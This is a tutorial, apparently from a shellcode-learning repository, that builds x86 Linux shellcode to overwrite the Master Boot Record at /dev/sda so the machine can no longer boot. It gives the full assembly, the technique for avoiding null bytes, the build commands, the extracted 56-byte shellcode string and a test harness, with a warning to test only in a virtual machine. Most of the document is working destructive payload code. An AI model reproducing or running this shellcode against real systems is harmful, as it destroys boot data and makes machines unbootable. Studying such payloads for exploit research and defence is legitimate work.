# overwriteMBR
The shellcode overwrites the MBR (Master Boot Record) with 'AHHA', so that the user won't be able to boot to the drive anymore. It overwrites the MBR on the location /dev/sda. The shellcode can only be succesfully executed when the shellcode gets executed with root permissions. This can happen when someone finds a vulnerability in a binary with the setuid privilege or a service that is excecuted by the root user.  
  
The functions we need are the open() and write() functions, these can be easily found on the man page.
```C++
int open(const char *pathname, int flags);                  // 5 -> syscall value
ssize_t write(int fd, const void *buf, size_t count);       // 4 -> syscall value
```
  
The first thing we have to do is open the file located at /dev/sda.  
```asm
_start:
        ; open the /dev/sda
        xor eax, eax
        push eax
        push 0x6164732f ; ads/
        push 0x7665642f ; ved/
        mov ebx, esp
```
  
We want the open() syscall to open the file with the O_TRUNC and O_RDWR flags, this is so that the file will be opened with the cursor at the start that we are able to write to the file. To to this we need to append the flags with each other in a special way. In C, we would do something like this:  
```C++
O_TRUNC | O_RDWR
```
But we are writing it in assembly, so we need to find out what the values are of these flags, it will be a integer value. We can write a small C++ program for this: (test.cpp)  
```C++
// Compile: g++ -o test test.cpp
#include <fcntl.h>
#include <iostream>

int main()
{
  printf("%d\n", O_TRUNC | O_RDWR);
  return 0;
  // Output: 514
}
```
Now that we know what value to append for the parameter of the open() syscall. We can fill in the value 514 in the second parameter of the open() function, but if we fill in 0x202 in the ECX register, we will get zero's in the byte output. We don't want that, because this will get string terminated in a buffer. So we need to find a way to give the ECX register the value 0x202 without the zero's.  
We can get to the value 512 with shifting and then later add the value 2, like so:  
```asm
xor ecx, ecx            ; zero out ecx
inc ecx
shl ecx, 9              ; store integer 512, which is the value of O_TRUNC
add ecx, O_RDWR         ; to make 512 -> 514 for O_TRUNC | O_RDWR
```
Now we can call the syscall with int 0x80.  
  
To write to the MBR, we need to make a buffer of 512 bytes with 'HAHA' repeatedly and use the file-descriptor of the output of the open() syscall. We simply move the EAX register to EBX register for the first parameter of the write() syscall. EAX was our output of the open() syscall and contains the file descriptor of the MBR file. In assembly it is done like so:  
```asm
mov ebx, eax            ; file pointer to ebx
xor eax, eax            ; zero out eax
```
To create a buffer of 'HAHA' with the size of 512, we can make a loop that fills the stack with the value 'HAHA' 128 times. This is because 'HAHA' has a length of 4 and that times to 128 makes 512, that the size is of the MBR. To do this we have to zero out the ECX value, so we can use the CL register that acts as our counter for the loop. We give it a value of 128 and let it loop with a push of our 'HAHA' bytes.  
```asm
        xor ecx, ecx            ; zero out ecx
        mov cl, 128             ; counter of loop, 128 * 4 = 512
        push eax
fill:
        push 0x48414841         ; push 'HAHA' to stack
        loop fill
``` 

When that is done, we have to simply fill the rest of the write() syscall. The last parameter of the function is a variable with the size of the buffer. We can do the same trick as first, to give the value of 512.  
The finishing code looks like this:  
```asm
mov al, SYS_WRITE
mov ecx, esp

xor edx, edx            ; zero out edx
inc edx
shl edx, 9              ; store integer 512
int 0x80
```
  
To compile it we use the same commands as the other shellcode projects:  
```bash
nasm -f elf òverwriteMBR.asm
ld -m elf_i386 overwriteMBR.o -o overwriteMBR
```
Now to extract the bytes from the compiled binary, I found a one-liner that gets the bytes for us from the binary.
```bash
for i in $(objdump -d ./overwriteMBR -M intel | grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
``` 

This gets for us:  
```Python
shellcode:  
"\x31\xc0\x50\x68\x2f\x73\x64\x61\x68\x2f\x64\x65\x76\x89\xe3\xb0\x05\x31\xc9\x41\xc1\xe1\x09\x83\xc1\x02\xcd\x80\x89\xc3\x31\xc0\x31\xc9\xb1\x80\x50\x68\x41\x48\x41\x48\xe2\xf9\xb0\x04\x89\xe1\x31\xd2\x42\xc1\xe2\x09\xcd\x80" 
size 56 bytes.  
```

Now we want to test our shellcode, make sure to use a VM and DON'T test it on your own machine. Because you will erase your own Master Boot Record!  
The source code of the test is: tester.c
```C++
// tester.c
// Compile: g++ -o tester tester.c -m32 -z execstack
char shellcode[] = "...";
int main() {

  ((void (*)())shellcode)();
}
```
